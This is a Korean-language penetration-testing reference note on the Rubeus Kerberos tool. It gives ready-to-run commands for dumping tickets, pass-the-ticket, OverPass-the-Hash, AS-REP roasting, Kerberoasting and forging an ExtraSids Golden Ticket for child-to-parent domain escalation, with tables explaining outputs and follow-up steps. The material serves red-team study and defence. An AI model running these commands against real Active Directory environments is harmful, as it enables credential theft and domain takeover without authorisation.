---
tags:
  - 환경/ad
  - 서비스/kerberos
  - 기능/자격증명수집
실행환경: ["Windows"]
필요권한: ["도메인 연결 Windows 호스트의 셸"]
필요조건: ["기능에 따라 도메인 인증 정보, Kerberos 키, ticket 또는 현재 Kerberos 세션", "Golden Ticket 생성 시 도메인 SID와 krbtgt key"]
결과: ["Kerberos 티켓", "roast 해시", "ExtraSids Golden Ticket", "netonly 세션"]
---

# rubeus

## 도구 개요

Rubeus는 Windows에서 Kerberos ticket을 조회·요청·덤프·주입·생성하고 AS-REP Roasting과 Kerberoasting을 수행하는 도구다. 기존 세션과 분리한 ticket 작업부터 hash·key 기반 TGT 요청, ExtraSids Golden Ticket까지 Kerberos 중심의 여러 작업을 한 실행 파일에서 다룰 때 사용한다.

## 필요한 입력과 실행 환경

- 실행 환경: Windows
- 공통 입력: 실행할 Rubeus 명령과 도메인·사용자 컨텍스트
- TGT 요청 입력: 사용자명, 도메인, NTLM/AES key 또는 현재 인증 정보
- ticket 입력: `.kirbi` 파일 또는 Base64 ticket
- roast 입력: 현재 도메인 세션 또는 명시한 도메인·계정 조건

## 표준 사용법

```cmd
Rubeus.exe <command> [options]
```

## 대표 예시

### 현재 세션의 Kerberos ticket 덤프

```cmd
Rubeus.exe dump /nowrap
```

### hash/key로 TGT 요청 후 바로 주입

```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NTLM_HASH> /ptt
```

### kirbi ticket을 현재 세션에 주입

```cmd
Rubeus.exe ptt /ticket:c:\tools\<TICKET_FILE>
```

### 별도 netonly 세션 생성

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### AS-REP roast hash 수집

```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
```

### Kerberoast hash 수집

```cmd
Rubeus.exe kerberoast /nowrap /outfile:kerberoast.hashes
Rubeus.exe kerberoast /user:<SPN_USER> /nowrap /outfile:kerberoast.hashes
```

### 신뢰 대상 도메인의 Kerberoast hash 수집

```cmd
Rubeus.exe kerberoast /domain:<TARGET_TRUST_DOMAIN> /user:<SPN_USER> /nowrap /outfile:trusted-domain-kerberoast.hashes
```

`Target Domain`, `SamAccountName`, `ServicePrincipalName`과 `$krb5tgs$` hash가 대상 도메인 계정에 해당하는지 확인한다.

### 부모 Enterprise Admins SID를 포함한 Golden Ticket 생성·주입

```cmd
Rubeus.exe golden /rc4:<CHILD_KRBTGT_NT_HASH> /domain:<CHILD_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<ROOT_ENTERPRISE_ADMINS_SID> /user:<CHILD_USER> /ptt
```

`Domain`·`SID`는 자식 도메인, `ExtraSIDs`는 부모 `Enterprise Admins` SID와 일치해야 한다. `Ticket successfully imported!` 뒤 부모 DC 리소스 접근이나 DCSync로 실제 권한을 별도 확인한다.


## 주요 옵션과 명령

| 명령·옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `dump` | 현재 세션의 ticket 출력 | 기존 TGT/TGS 확인 |
| `asktgt` | key 또는 hash로 TGT 요청 | OverPass the Hash |
| `ptt` | ticket을 logon session에 주입 | Pass the Ticket |
| `asreproast` | pre-auth 미요구 계정의 AS-REP hash 요청 | AS-REP Roasting |
| `kerberoast` | SPN 계정의 TGS hash 요청 | Kerberoasting |
| `golden` | 보유한 `krbtgt` key로 TGT 생성 | Golden Ticket과 ExtraSids 경로 |
| `createnetonly` | 별도 netonly logon session 생성 | 기존 세션과 ticket context 분리 |
| `/user`, `/domain` | 사용자와 도메인 지정 | TGT와 roast 요청 |
| `/rc4`, `/aes128`, `/aes256` | Kerberos key 지정 | `asktgt` |
| `/ticket`, `/ptt` | ticket 입력 또는 즉시 주입 | ticket 재사용 |
| `/nowrap` | Base64 ticket 줄바꿈 제거 | 복사·저장 가능한 출력 |
| `/user:<USER>` | roast 또는 ticket 요청 대상을 단일 계정으로 제한 | 표적 Kerberoasting과 수집 범위 축소 |
| `/sids:<SID>` | PAC의 ExtraSids에 추가 SID 포함 | 같은 포리스트 자식→부모 Enterprise Admins 권한 경로 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| TGT/TGS 출력 또는 base64 ticket | Kerberos ticket 확보 | `.kirbi` 저장, `ptt`, `klist`로 주입/확인 |
| AS-REP/Kerberoast hash 출력 | 오프라인 cracking 대상 확보 | John/Hashcat mode 확인 후 cracking |
| `KRB_AP_ERR` / preauth / clock skew 오류 | Kerberos 조건 불일치 | 시간 동기화, SPN, 계정 속성, realm 확인 |
| `ptt` 성공 | 현재 세션에 ticket 주입 | 대상 서비스 접근으로 인증 여부 확인 |
| ticket 사용 실패 | 권한/서비스 범위 불일치 | `klist`, ticket 만료, 대상 서비스 ACL 확인 |
| `Target Domain`과 `$krb5tgs$` hash | 지정한 신뢰 대상 도메인에서 TGS hash 수집 | 오프라인 크래킹 후 대상 도메인 인증 확인 |
| `ExtraSIDs`와 `Ticket successfully imported!` | 추가 SID가 포함된 Golden Ticket 생성·주입 | 부모 SMB·LDAP·DRSUAPI 동작으로 권한 확인 |

## 관련 공격기법

- [[AS-REP Roasting]]
- [[Kerberoasting]]
- [[임시 SPN 설정]]과 [[표적 Kerberoasting]]
- [[Pass the Ticket]]
- [[OverPass the Hash]]
- [[자식 도메인 ExtraSids Golden Ticket]]
- [[AD 도메인 트러스트 열거와 공격 경로 식별]]
